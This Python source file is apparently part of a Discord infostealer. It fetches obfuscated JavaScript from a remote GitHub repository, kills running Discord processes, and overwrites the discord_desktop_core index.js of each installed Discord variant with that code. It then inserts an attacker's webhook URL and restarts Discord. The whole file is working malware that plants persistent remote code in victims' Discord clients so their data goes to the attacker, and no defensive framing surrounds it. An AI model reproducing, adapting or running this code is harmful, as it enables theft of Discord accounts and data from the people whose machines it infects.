import re, os, requests, psutil, subprocess

def use_discord_injection(webhook: str) -> None:
    appdata = os.getenv('LOCALAPPDATA')
    discord_dirs = [
        appdata + '\\Discord',
        appdata + '\\DiscordCanary',
        appdata + '\\DiscordPTB',
        appdata + '\\DiscordDevelopment'
    ]
    code = requests.get(
        'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
    for proc in psutil.process_iter():
        if 'discord' in proc.name().lower():
            proc.kill()
    for dir in discord_dirs:
        if not os.path.exists(dir):
            continue
        if get_core(dir) is not None:
            with open(get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                f.write((code).replace('discord_desktop_core-1',
                        get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                start_discord(dir)

def get_core(dir: str) -> tuple:
    for file in os.listdir(dir):
        if re.search(r'app-+?', file):
            modules = dir + '\\' + file + '\\modules'
            if not os.path.exists(modules):
                continue
            for file in os.listdir(modules):
                if re.search(r'discord_desktop_core-+?', file):
                    core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                    if not os.path.exists(core + '\\index.js'):
                        continue
                    return core, file

def start_discord(dir: str) -> None:
    update = dir + '\\Update.exe'
    executable = dir.split('\\')[-1] + '.exe'
    for file in os.listdir(dir):
        if re.search(r'app-+?', file):
            app = dir + '\\' + file
            if os.path.exists(app + '\\' + 'modules'):
                for file in os.listdir(app):
                    if file == executable:
                        executable = app + '\\' + executable
                        subprocess.call([update, '--processStart', executable],
                                        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)